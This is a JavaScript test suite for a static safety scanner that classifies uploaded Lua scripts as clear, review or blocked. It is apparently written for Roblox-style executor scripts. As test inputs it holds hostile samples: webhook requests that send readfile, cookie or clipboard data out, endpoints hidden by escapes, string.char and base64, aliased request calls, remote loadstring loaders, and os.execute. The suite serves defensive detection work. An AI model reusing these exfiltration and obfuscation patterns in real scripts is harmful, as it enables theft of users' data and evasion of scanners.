'use strict';
const assert = require('assert/strict');
const { scanScript, SCANNER_VERSION, MAX_BYTES } = require('./src/services/script-safety');
let checks = 0;
function test(name, run) { run(); checks++; console.log('PASS ' + name); }
function scan(code) { return scanScript(code); }
function has(result, rule) { return result.findings.some(finding => finding.rule === rule); }
const endpoint = 'https://discord.com/api/webhooks/123/PRIVATE_SECRET_TOKEN';

test('ordinary Lua has a clear static triage result', () => assert.equal(scan('local x = 1; print(x)').status, 'clear'));
test('empty input is refused', () => assert.equal(scan(' ').status, 'blocked'));
test('non-string input is refused without executing conversion', () => assert.equal(scan({ toString() { throw new Error('Executed'); } }).status, 'blocked'));
test('oversized input is refused', () => assert.equal(scan('x'.repeat(MAX_BYTES + 1)).status, 'blocked'));
test('SHA256 and scanner version are stable', () => {
  const result = scan('print(1)');
  assert.match(result.hash, /^[a-f0-9]{64}$/); assert.equal(result.hash, scan('print(1)').hash); assert.equal(result.scannerVersion, SCANNER_VERSION);
});
test('line comments cannot inject scanner findings', () => assert.equal(scan('-- readfile("cookies"); request("' + endpoint + '")\nprint(1)').status, 'clear'));
test('long comments with equals delimiters are ignored', () => assert.equal(scan('--[==[ getclipboard(); loadstring("secret"); request("' + endpoint + '") ]==]\nprint(1)').status, 'clear'));
test('function names inside plain text are not executable calls', () => assert.equal(scan('print("request readfile loadstring getclipboard")').status, 'clear'));
test('ordinary HTTP data use is informational', () => {
  const result = scan('local data = game:HttpGet("https://example.org/data.json")');
  assert.equal(result.status, 'clear'); assert(has(result, 'network_access'));
});
test('a webhook string alone requires review rather than automatic malware classification', () => assert.equal(scan('print("' + endpoint + '")').status, 'review'));
test('webhook requests are blocked', () => assert.equal(scan('request({Url="' + endpoint + '",Body="test"})').status, 'blocked'));
test('Discord versioned webhook endpoint is recognized', () => assert.equal(scan('syn.request({Url="https://discordapp.com/api/v10/webhooks/123/secret"})').status, 'blocked'));
test('Slack webhook request is recognized', () => assert.equal(scan('http_request({Url="https://hooks.slack.com/services/private"})').status, 'blocked'));
test('literal concatenation reconstructs endpoints', () => assert.equal(scan('request({Url="https://discord" .. ".com/api/" .. "webhooks/123/secret"})').status, 'blocked'));
test('constant variables reconstruct concatenated endpoints', () => assert.equal(scan('local host="https://discord.com"; local route="/api/webhooks/123/secret"; local url=host..route; request({Url=url})').status, 'blocked'));
test('decimal escapes reconstruct encoded endpoints', () => {
  const encoded = [...endpoint].map(c => '\\' + c.charCodeAt(0)).join('');
  assert.equal(scan('request({Url="' + encoded + '"})').status, 'blocked');
});
test('hex escapes reconstruct encoded endpoints', () => {
  const encoded = [...endpoint].map(c => '\\x' + c.charCodeAt(0).toString(16)).join('');
  assert.equal(scan('request({Url="' + encoded + '"})').status, 'blocked');
});
test('unicode escapes reconstruct encoded endpoints', () => {
  const encoded = [...endpoint].map(c => '\\u{' + c.charCodeAt(0).toString(16) + '}').join('');
  assert.equal(scan('request({Url="' + encoded + '"})').status, 'blocked');
});
test('string.char calls reconstruct encoded endpoints', () => assert.equal(scan('request({Url=string.char(' + [...endpoint].map(c => c.charCodeAt(0)).join(',') + ')})').status, 'blocked'));
test('string.char aliases reconstruct encoded endpoints', () => assert.equal(scan('local c=string.char; request({Url=c(' + [...endpoint].map(c => c.charCodeAt(0)).join(',') + ')})').status, 'blocked'));
test('bracket member request aliases are tracked', () => assert.equal(scan('local send=syn["re".."quest"]; send({Url="' + endpoint + '"})').status, 'blocked'));
test('request alias chains are tracked', () => assert.equal(scan('local a=request; local b=a; b({Url="' + endpoint + '"})').status, 'blocked'));
test('parenthesized aliases are tracked', () => assert.equal(scan('local a=(syn.request); a({Url="' + endpoint + '"})').status, 'blocked'));
test('parenthesized calls cannot hide capabilities', () => assert.equal(scan('(request)({Url="' + endpoint + '"})').status, 'blocked'));
test('called environment bracket members cannot hide capabilities', () => assert.equal(scan('getfenv()["request"]({Url="' + endpoint + '"})').status, 'blocked'));
test('encoded environment bracket members cannot hide dynamic execution', () => assert.equal(scan('getfenv()[string.char(108,111,97,100,115,116,114,105,110,103)](data)()').status, 'review'));
test('simple base64 endpoint strings are inspected', () => assert.equal(scan('request({Url=decode("' + Buffer.from(endpoint).toString('base64') + '")})').status, 'blocked'));
test('reading files requires review', () => assert.equal(scan('local x=readfile("settings.json")').status, 'review'));
test('file reading and network capabilities are blocked conservatively', () => assert.equal(scan('local data=readfile("cookies"); request({Body=data})').status, 'blocked'));
test('sensitive alias plus network transfer is blocked', () => assert.equal(scan('local read=readfile; local send=syn.request; send({Body=read("secret")})').status, 'blocked'));
test('clipboard reading and network transfer is blocked', () => assert.equal(scan('request({Body=getclipboard()})').status, 'blocked'));
test('clipboard writing alone is informational', () => assert.equal(scan('setclipboard("https://example.org/key")').status, 'clear'));
test('filesystem mutations require review', () => assert.equal(scan('writefile("config.json", "{}"); delfile("config.json")').status, 'review'));
test('remote executable loaders require review', () => {
  const result = scan('loadstring(game:HttpGet("https://example.org/code.lua"))()');
  assert.equal(result.status, 'review'); assert(has(result, 'remote_dynamic_code'));
});
test('dynamic code aliases require review', () => assert.equal(scan('local run=loadstring; run(data)()').status, 'review'));
test('external require modules require review', () => assert.equal(scan('local library=require(123456)').status, 'review'));
test('large encoded literals cannot be classified clear', () => assert.equal(scan('local payload="' + 'A'.repeat(2048) + '"').status, 'review'));
test('opaque virtual machine numeric payload is held', () => assert.equal(scan('local bytes={' + Array(1100).fill(42).join(',') + '}; while true do local op=bytes[1] end').status, 'review'));
test('truncated inspected literals are held for review', () => assert.equal(scan('local payload=[=[' + 'x!'.repeat(9000) + ']=]').status, 'review'));
test('incomplete strings are held, with no raw content returned', () => assert.equal(scan('local x="SECRET').status, 'review'));
test('findings contain safe fields only and never raw secrets', () => {
  const result = scan('readfile("SENSITIVE_FILENAME"); request({Url="' + endpoint + '"})');
  assert(!JSON.stringify(result).includes('PRIVATE_SECRET_TOKEN')); assert(!JSON.stringify(result).includes('SENSITIVE_FILENAME'));
  for (const finding of result.findings) assert.deepEqual(Object.keys(finding).sort(), ['line', 'rule', 'severity']);
});
test('findings report source line numbers', () => assert(scan('print(1)\n\nlocal x=readfile("x")').findings.some(f => f.rule === 'sensitive_data_access' && f.line === 3)));
test('findings are bounded without downgrading a later high finding', () => {
  const code = Array.from({ length: 80 }, (_, i) => 'request({Url="https://example.org/' + i + '"})').join('\n') + '\nreadfile("secret")';
  const result = scan(code); assert(result.findings.length <= 64); assert.equal(result.status, 'blocked'); assert(result.findings.some(f => f.severity === 'high'));
});
test('token explosion is bounded and refused', () => assert.equal(scan(';'.repeat(150001)).status, 'blocked'));
test('a clear obfuscated output does not erase source triage evidence', () => {
  const before = scan('loadstring(remote)()'); const after = scanScript('local a=1;print(a)', { phase: 'output' });
  assert.equal(before.status, 'review'); assert.equal(after.status, 'clear');
});
test('scanner never executes uploaded source', () => {
  const source = 'os.execute("echo SHOULD_NEVER_EXECUTE"); error("NEVER_EXECUTE")';
  assert.doesNotThrow(() => scan(source));
});
test('operating system process execution is blocked', () => assert.equal(scan('os.execute("echo evil")').status, 'blocked'));
console.log('Script safety: ' + checks + ' checks passed.');
